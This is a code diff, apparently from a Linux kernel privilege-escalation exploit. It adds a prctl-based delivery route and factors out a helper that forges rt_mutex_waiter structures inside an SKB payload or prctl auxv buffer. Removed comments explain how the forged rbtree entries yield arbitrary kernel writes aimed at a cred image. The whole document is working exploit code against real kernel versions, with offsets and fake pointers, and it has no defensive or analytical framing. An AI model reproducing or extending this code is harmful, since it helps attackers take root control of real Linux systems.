@@ -86,6 +86,17 @@ int kernel5_route_selected(void) {
   return mcast_geometry_ok();
 }
 
+int prctl_route_selected(void) {
+  const char *s = getenv("GHOSTLOCK_ROUTE");
+  if (s && *s) {
+    return strcmp(s, "prctl") == 0;
+  }
+  /* only when the entry carries the geometry; the pselect arm is the fallback */
+  return active_offsets && active_offsets->prctl_auxv_off > 0 &&
+         active_offsets->prctl_auxv_size > 0 &&
+         active_offsets->prctl_waiter_off > 0;
+}
+
 void setup_kernelsnitch(void) {
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   ks = kernelsnitch_setup(
@@ -374,6 +385,54 @@ void prepare_ctxs(void) {
   post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
 }
 
+/* rt_mutex_waiter words that must land on the stale waiter: tree/pi_tree
+ * entries carry the write (pc = value, rb_left = target), task and lock point
+ * at the payload. Shared by the SKB page and the prctl auxv buffer. */
+void write_waiter_words(unsigned char *p, size_t w0,
+                               uintptr_t write_pc, uintptr_t write_right,
+                               uintptr_t write_left, uint64_t waiter_task,
+                               uint64_t fake_lock, int compact) {
+  if (compact) {
+    put64(p, w0 + 0x00, 1);
+    put64(p, w0 + 0x08, 0);
+    put64(p, w0 + 0x10, 0);
+    if (write_right) {
+      put64(p, w0 + 0x18, write_right);
+      put64(p, w0 + 0x20, 0);
+      put64(p, w0 + 0x28, pselect_custom_target);
+    } else {
+      put64(p, w0 + 0x18, write_pc);
+      put64(p, w0 + 0x20, write_right);
+      put64(p, w0 + 0x28, write_left);
+    }
+    put64(p, w0 + 0x30, waiter_task);
+    put64(p, w0 + 0x38, fake_lock);
+    if (waiter_prio_off() == WAITER_PRIO_OFF) {
+      put32(p, w0 + 0x40, 0);
+      put32(p, w0 + 0x44, FAKE_WAITER_PRIO);
+    } else {
+      put32(p, w0 + 0x40, FAKE_WAITER_PRIO);
+    }
+    put64(p, w0 + 0x48, 0);
+    put64(p, w0 + 0x50, 0);
+  } else {
+    put64(p, w0 + 0x00, 1);
+    put64(p, w0 + 0x08, 0);
+    put64(p, w0 + 0x10, 0);
+    put32(p, w0 + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
+    put64(p, w0 + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
+    put64(p, w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
+    put64(p, w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
+    put64(p, w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
+    put32(p, w0 + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
+    put64(p, w0 + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
+    put64(p, w0 + FAKE_WAITER_TASK_OFF, waiter_task);
+    put64(p, w0 + FAKE_WAITER_LOCK_OFF, fake_lock);
+    put32(p, w0 + FAKE_WAITER_WAKE_STATE_OFF, 0);
+    put64(p, w0 + FAKE_WAITER_WW_CTX_OFF, 0);
+  }
+}
+
 int prepare_skb_payload(uintptr_t base) {
   memset(skb_buf, 0, SKB_SEND_SIZE);
 
@@ -431,50 +490,11 @@ int prepare_skb_payload(uintptr_t base) {
     put64(p, LOCK_OFF + 0x18, fake_task | 1);
 
     if (compact) {
-      /* Words ride the erase relink: pc = value, rb_left = dest,
-       * rb_right = 0 or the one-child arm also clobbers *(value) with
-       * dest-8. Value 0 uses pc = dest-8 (stores 0 at *dest); pc = 0
-       * would leave the node parentless for enqueue_pi to trash
-       * fake_task. prio > 120 gates this erase. The relink's second
-       * write lands in *(value+8): cred image on W2, page rb_root at 0. */
-      put64(p, W0_OFF + 0x00, 1);           /* tree_entry.rb_parent_color */
-      put64(p, W0_OFF + 0x08, 0);           /* tree_entry.rb_right */
-      put64(p, W0_OFF + 0x10, 0);           /* tree_entry.rb_left */
-      if (write_right) {
-        put64(p, W0_OFF + 0x18, write_right);
-        put64(p, W0_OFF + 0x20, 0);
-        put64(p, W0_OFF + 0x28, pselect_custom_target);
-      } else {
-        put64(p, W0_OFF + 0x18, write_pc);    /* pi_tree_entry.rb_parent_color */
-        put64(p, W0_OFF + 0x20, write_right); /* pi_tree_entry.rb_right */
-        put64(p, W0_OFF + 0x28, write_left);  /* pi_tree_entry.rb_left */
-      }
-      put64(p, W0_OFF + 0x30, waiter_task); /* task */
-      put64(p, W0_OFF + 0x38, fake_lock);   /* lock */
-      if (waiter_prio_off() == WAITER_PRIO_OFF) {
-        put32(p, W0_OFF + 0x40, 0);                /* wake_state */
-        put32(p, W0_OFF + 0x44, FAKE_WAITER_PRIO); /* prio */
-      } else {
-        put32(p, W0_OFF + 0x40, FAKE_WAITER_PRIO); /* prio */
-      }
-      put64(p, W0_OFF + 0x48, 0);           /* deadline */
-      put64(p, W0_OFF + 0x50, 0);           /* ww_ctx */
+      write_waiter_words(p, W0_OFF, write_pc, write_right, write_left,
+                         waiter_task, fake_lock, 1);
     } else {
-      /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
-      put64(p, W0_OFF + 0x00, 1);
-      put64(p, W0_OFF + 0x08, 0);
-      put64(p, W0_OFF + 0x10, 0);
-      put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
-      put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
-      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
-      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
-      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
-      put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
-      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
-      put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
-      put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
-      put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
-      put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
+      write_waiter_words(p, W0_OFF, write_pc, write_right, write_left,
+                         waiter_task, fake_lock, 0);
     }
 
     /* Use runtime offsets for 6.1 compact; target.h constants for 6.6. */
